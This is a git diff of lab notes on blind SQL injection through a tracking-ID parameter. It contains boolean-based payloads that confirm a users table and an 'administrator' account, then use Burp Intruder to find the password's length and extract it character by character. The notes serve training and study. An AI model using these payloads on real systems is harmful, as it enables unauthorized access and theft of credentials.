@@ -12,11 +12,12 @@ When testing for Blind SQL the first step is to force a TRUE/FALSE use case to s
 then figure out how to exploit the web app. For this lab we are going to focus on using the tracking ID to trigger a TRUE/FALSE use case.
 
 1. Confirm that the parameter is vulnerable to Blind SQL
-    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap'
+    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' --> (how the query would look on the back end)
     -> if this tracking id exists -> query returns value -> 'Welcome Back' message
     -> if it doesnt exist -> no 'Welcome Back' message
 
-    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' and 1=1--'
+    
+    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' and 1=1--' 
     -> TRUE -> trigger a 'Welcome Back' message
 
     select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' and 1=0--'
@@ -29,16 +30,37 @@ then figure out how to exploit the web app. For this lab we are going to focus o
 
     select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' and (select 'x' from users LIMIT 1)='x'--
         ->select any random value (here we are choosing 'x') and LIMIT the entry value to 1 
-        ->this is saying if there is a users table -> output the value 'x' for each entry in the users table -> if the users table has 5 entries then we should get
+        ->this is saying if there is a users table -> output the value 'x' for each entry in the users table e.g if the users table has 5 entries then we should get
           5 rows with 'x' in them 
     This returns the 'Welcome Back' message thus confirming that the user table exists in the database. 
 
 3. Confirm that the username 'administrator' exists in the database
 
-    'wj6FkJCkmttewQap' and (select username from users username='administrator')='administrator'--
+    'wj6FkJCkmttewQap' and (select username from users where username='administrator')='administrator'--
         ->select the username 'administrator' from the users table -> if it exists does it equal the string 'administrator' -> if it does it will be a TRUE statement which will return the
           'Welcome Back' message
         
     This returns the 'Welcome Back' message thus confirming that the username 'administrator' exists in the database. 
 
 4. Enumerate the password of administrator user
+
+    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--
+
+    Here we are enumerating the length of the password for administrator, to do this -> send request to burp intruder and select the length of the password as the position so you can brute force the length until you find a different response length. When the
+    length responds with a different code you know that the output of the result is different indicating the lenght of the password is now FALSE. 
+    --> Password is 20 characters
+
+
+    select tracking-id from tracking-table where trackingid = 'wj6FkJCkmttewQap' 
+    and (select substring(password,1,1) from users where username='administrator')='a'--
+
+    This will enumerate the character value of the password starting with 'a'. Send this request to burp intruder - for payload type select 'Brute Forcer' and set a single position for the single
+    character in the request that we are targeting. 
+
+    To use burp and enumerate the entire password 
+    -send request to intruder
+    -set attack type to 'Cluster Bomb'
+    -add position for the first parameter in the substring method --> substring(password,§1§,1)
+    -add position for the alphanumeric characters you are searching for --> username='administrator')='§a§'--
+    -set first payload to 'Numbers', 1-20, step=1
+    -set second payload to 'Bruteforcer', max/min = 1
